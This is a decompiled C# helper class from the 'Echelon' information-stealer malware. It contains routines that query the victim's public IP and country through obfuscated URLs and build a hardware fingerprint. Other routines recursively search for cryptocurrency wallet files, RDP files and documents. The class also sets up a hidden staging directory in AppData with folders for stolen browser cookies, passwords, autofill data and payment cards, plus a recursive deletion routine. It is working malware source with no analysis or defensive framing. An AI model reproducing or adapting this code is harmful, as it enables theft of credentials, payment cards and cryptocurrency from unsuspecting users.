using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Xml;
using Echelon.Stealer.Grab;

namespace Echelon.Global
{
	// Token: 0x0200005A RID: 90
	public static class Help
	{
		// Token: 0x0600020C RID: 524 RVA: 0x000221AC File Offset: 0x000203AC
		public static string IP()
		{
			string result;
			try
			{
				result = new WebClient().DownloadString(Decrypt.Get("H4sIAAAAAAAEAMsoKSkottLXTyzI1MssyEyr1MsvStcHAPAN4yoWAAAA"));
			}
			catch
			{
				result = "Connection error";
			}
			return result;
		}

		// Token: 0x0600020D RID: 525 RVA: 0x000221EC File Offset: 0x000203EC
		public static string CountryCOde()
		{
			string result;
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.LoadXml(new WebClient().DownloadString(Help.GeoIpURL));
				result = "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "]";
			}
			catch
			{
				result = "ERR";
			}
			return result;
		}

		// Token: 0x0600020E RID: 526 RVA: 0x00022258 File Offset: 0x00020458
		public static string Country()
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(new WebClient().DownloadString(Help.GeoIpURL));
			return "[" + xmlDocument.GetElementsByTagName("country")[0].InnerText + "]";
		}

		// Token: 0x0600020F RID: 527 RVA: 0x000222A8 File Offset: 0x000204A8
		public static string GetHwid()
		{
			string result = "";
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				result = managementObject["VolumeSerialNumber"].ToString();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x06000210 RID: 528 RVA: 0x0002230C File Offset: 0x0002050C
		public static string GetProcessorID()
		{
			string result = "";
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get())
			{
				result = (string)((ManagementObject)managementBaseObject)["ProcessorId"];
			}
			return result;
		}

		// Token: 0x06000211 RID: 529 RVA: 0x00022378 File Offset: 0x00020578
		public static List<string> GetFilesDoc(string path, string pattern)
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(from s in Ober.AMBAL_GetFiles(path, pattern, SearchOption.TopDirectoryOnly)
				where Program.exten.Contains(Path.GetExtension(s).ToLower())
				select s);
				foreach (string path2 in Directory.GetDirectories(path))
				{
					try
					{
						list.AddRange(Help.GetFilesDoc(path2, pattern));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000212 RID: 530 RVA: 0x00022414 File Offset: 0x00020614
		public static List<string> GetWall(string path, string pattern)
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(from s in Ober.AMBAL_GetFiles(path, pattern, SearchOption.TopDirectoryOnly)
				where Help.walletExtension.Contains(Path.GetExtension(s).ToLower())
				select s);
				foreach (string path2 in Directory.GetDirectories(path))
				{
					try
					{
						list.AddRange(Help.GetWall(path2, pattern));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000213 RID: 531 RVA: 0x000224B0 File Offset: 0x000206B0
		public static List<string> GetRdp(string path, string pattern)
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(from s in Ober.AMBAL_GetFiles(path, pattern, SearchOption.TopDirectoryOnly)
				where Help.rdpex.Contains(Path.GetExtension(s).ToLower())
				select s);
				foreach (string path2 in Directory.GetDirectories(path))
				{
					try
					{
						list.AddRange(Help.GetRdp(path2, pattern));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000214 RID: 532 RVA: 0x0002254C File Offset: 0x0002074C
		public static long CalculateDirectorySize(DirectoryInfo directory, bool includeSubdirectories)
		{
			long num = 0L;
			foreach (FileInfo fileInfo in directory.GetFiles())
			{
				num += fileInfo.Length;
			}
			if (includeSubdirectories)
			{
				foreach (DirectoryInfo directory2 in directory.GetDirectories())
				{
					num += Help.CalculateDirectorySize(directory2, true);
				}
			}
			return num;
		}

		// Token: 0x06000215 RID: 533 RVA: 0x000225BC File Offset: 0x000207BC
		public static void DeleteDirectory(string path)
		{
			if (Ober.AMBAL_DExist(path))
			{
				string[] array = Directory.GetFiles(path);
				for (int i = 0; i < array.Length; i++)
				{
					Ober.AMBAL_FDelete(array[i]);
				}
				array = Directory.GetDirectories(path);
				for (int i = 0; i < array.Length; i++)
				{
					Help.DeleteDirectory(array[i]);
				}
				Ober.AMBAL_DeleteDir(path);
			}
		}

		// Token: 0x04000111 RID: 273
		public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		// Token: 0x04000112 RID: 274
		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000113 RID: 275
		public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x04000114 RID: 276
		public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		// Token: 0x04000115 RID: 277
		public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

		// Token: 0x04000116 RID: 278
		public static readonly string userName = Environment.UserName;

		// Token: 0x04000117 RID: 279
		public static readonly string machineName = Environment.MachineName;

		// Token: 0x04000118 RID: 280
		public static readonly string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

		// Token: 0x04000119 RID: 281
		public static string walletExtension = "*.wallet,*.dat";

		// Token: 0x0400011A RID: 282
		public static string rdpex = "*.rdp";

		// Token: 0x0400011B RID: 283
		public static string HWID = Help.GetProcessorID() + Help.GetHwid();

		// Token: 0x0400011C RID: 284
		public static string GeoIpURL = Decrypt.Get("H4sIAAAAAAAEAMsoKSmw0tfPLNBNLMjUS87P1a/IzQEAoQIM4RUAAAA=");

		// Token: 0x0400011D RID: 285
		public static string dir = string.Concat(new string[]
		{
			Help.AppDate,
			"\\",
			GenString.Generate(),
			Help.HWID,
			GenString.GeneNumbersTo().ToString()
		});

		// Token: 0x0400011E RID: 286
		public static string collectionDir = string.Concat(new string[]
		{
			Help.dir,
			"\\",
			GenString.GeneNumbersTo().ToString(),
			Help.HWID,
			GenString.Generate()
		});

		// Token: 0x0400011F RID: 287
		public static string Browsers = Help.collectionDir + "\\Browsers";

		// Token: 0x04000120 RID: 288
		public static string Cookies = Help.Browsers + "\\Cookies";

		// Token: 0x04000121 RID: 289
		public static string Passwords = Help.Browsers + "\\Passwords";

		// Token: 0x04000122 RID: 290
		public static string Autofills = Help.Browsers + "\\Autofills";

		// Token: 0x04000123 RID: 291
		public static string Downloads = Help.Browsers + "\\Downloads";

		// Token: 0x04000124 RID: 292
		public static string History = Help.Browsers + "\\History";

		// Token: 0x04000125 RID: 293
		public static string Cards = Help.Browsers + "\\Cards";

		// Token: 0x04000126 RID: 294
		public static string dirFiles = Help.dir + "\\Grab";

		// Token: 0x04000127 RID: 295
		public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt");

		// Token: 0x04000128 RID: 296
		public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");
	}
}
